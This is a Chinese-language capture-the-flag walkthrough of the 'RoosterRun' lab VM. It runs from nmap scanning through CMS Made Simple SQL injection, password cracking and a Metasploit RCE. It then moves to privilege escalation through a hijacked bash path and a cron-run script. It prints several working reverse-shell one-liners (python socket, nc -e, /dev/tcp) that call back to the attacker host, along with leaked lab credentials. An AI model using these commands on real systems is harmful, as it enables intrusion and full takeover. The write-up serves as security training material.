# RoosterRun

:::note

[Linux VM] [Tested on VirtualBox] created by || cromiphi

⏲️ Release Date // 2023-11-28

✔️ MD5 // 51ba3f43f1a914e1334efb64cb782767

☠ Root // 39

💀 User // 45

📝Notes //
Enjoy it.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.105
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.105
Host is up (0.00047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home - Blog
|_http-server-header: Apache/2.4.57 (Debian)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
```

## web 服务

尝试使用 [CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635) 获取信息

```plaintext
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
```

尝试破解密码

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $cat hash.txt
admin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d
┌─[✗]─[randark@parrot]─[~/tmp]
└──╼ $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
homeandaway      (admin)
```

利用这个凭据，就可以顺利登录后台

### CMS Made Simple 后台

利用 metasploit 进行自动化打击

```bash
[msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> show options

Module options (exploit/multi/http/cmsms_object_injection_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   homeandaway      yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.56.105   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base cmsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host
```

```bash
[msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> exploit

[*] Started reverse TCP handler on 192.168.56.102:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (39927 bytes) to 192.168.56.105
[+] Deleted SWSyWDIkwT.php
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.105:42034) at 2024-02-12 16:26:12 +0800

(Meterpreter 1)(/var/www/html/admin) > shell
Process 3356 created.
Channel 0 created.
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs -lp 9999
[16:27:01] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
[16:27:42] received connection from 192.168.56.105:46936                                                                                                                                              bind.py:84
[16:27:42] 192.168.56.105:46936: registered new host w/ db                                                                                                                                        manager.py:957
(local) pwncat$ back
(remote) www-data@rooSter-Run:/var/www/html/admin$ whoami
www-data
```

## User - www-data

探测网站的配置文件，发现以下信息

```php title="/var/www/html/config.php"
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'admin';
$config['db_password'] = 'j42W9kDq9dN9hK';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
```

### mysql 凭据泄露

```sql
MariaDB [cmsms_db]> show tables;
+--------------------------------+
| Tables_in_cmsms_db             |
+--------------------------------+
| cms_additional_users           |
| cms_additional_users_seq       |
| cms_admin_bookmarks            |
| cms_admin_bookmarks_seq        |
| cms_adminlog                   |
| cms_content                    |
| cms_content_props              |
| cms_content_props_seq          |
| cms_content_seq                |
| cms_event_handler_seq          |
| cms_event_handlers             |
| cms_events                     |
| cms_events_seq                 |
| cms_group_perms                |
| cms_group_perms_seq            |
| cms_groups                     |
| cms_groups_seq                 |
| cms_layout_design_cssassoc     |
| cms_layout_design_tplassoc     |
| cms_layout_designs             |
| cms_layout_stylesheets         |
| cms_layout_templates           |
| cms_layout_tpl_addusers        |
| cms_layout_tpl_categories      |
| cms_layout_tpl_type            |
| cms_locks                      |
| cms_mod_cmsjobmgr              |
| cms_mod_filepicker_profiles    |
| cms_module_deps                |
| cms_module_news                |
| cms_module_news_categories     |
| cms_module_news_categories_seq |
| cms_module_news_fielddefs      |
| cms_module_news_fieldvals      |
| cms_module_news_seq            |
| cms_module_search_index        |
| cms_module_search_items        |
| cms_module_search_items_seq    |
| cms_module_search_words        |
| cms_module_smarty_plugins      |
| cms_module_templates           |
| cms_modules                    |
| cms_permissions                |
| cms_permissions_seq            |
| cms_routes                     |
| cms_siteprefs                  |
| cms_user_groups                |
| cms_userplugins                |
| cms_userplugins_seq            |
| cms_userprefs                  |
| cms_users                      |
| cms_users_seq                  |
| cms_version                    |
+--------------------------------+
```

### 探测提权

在探测用户目录的时候，发现以下文件

```bash title="/home/matthieu/StaleFinder"
#!/usr/bin/env bash

for file in ~/*; do
    if [[-f $file]]; then
        if [[! -s $file]]; then
            echo "$file is empty."
        fi

        if [[$(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

目测是一种定期执行的脚本，可以尝试通过控制环境变量中的 `bash` 来实现提权

```bash
(remote) www-data@rooSter-Run:/home/matthieu$ echo -e '#!/bin/bash\nnc 192.168.56.102 8888 -e /bin/bash' > /usr/local/bin/bash
(remote) www-data@rooSter-Run:/home/matthieu$ chmod 777 /usr/local/bin/bash
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs -lp 8888
[19:41:59] Welcome to pwncat 🐈!
[19:42:01] received connection from 192.168.56.105:33504
[19:42:02] 0.0.0.0:8888: normalizing shell path
           192.168.56.105:33504: registered new host w/ db
(local) pwncat$ back
(remote) matthieu@rooSter-Run:/home/matthieu$ whoami
matthieu
```

## User - matthieu

### flag - user

```bash
(remote) matthieu@rooSter-Run:/home/matthieu$ cat user.txt
32af3c9a9cb2fb748aef29457d8cff55
```

### 尝试提权

对常见目录进行探测

```bash title="/opt/maintenance/backup.sh"
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[-f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[-f $file && ! -O $file]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```

借助这个脚本，可以将包含有恶意载荷的脚本放置于 `/opt/maintenance/pre-prod-tasks` 目录中，让这个定时任务去执行

首先，先创建一个包含有恶意载荷的脚本

```bash
(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '#!/bin/bash' > exp.sh
(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '/bin/bash -c"/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1"' >> exp.sh
(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ cat exp.sh
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1"
(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ chmod 777 exp.sh
```

然后稍等片刻，文件就会被定时任务复制到 `/opt/maintenance/prod-tasks`

```bash
(remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh
total 20K
-rwxr-xr-x 1 root root 77 Feb 13 03:23 exp.sh
```

将文件进行重命名

```bash
(remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh
total 20K
-rwxr-xr-x 1 root root 77 Feb 13 03:23 exp
```

重命名后稍等片刻，即可收到回连的 shell

```bash
┌─[randark@parrot]─[~]
└──╼ $nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 58044
bash: cannot set terminal process group (47863): Inappropriate ioctl for device
bash: no job control in this shell
root@rooSter-Run:~# whoami
root
```

## User - root

### flag - root

```bash
root@rooSter-Run:~# cat root.txt
670ff72e9d8099ac39c74c080348ec17
```
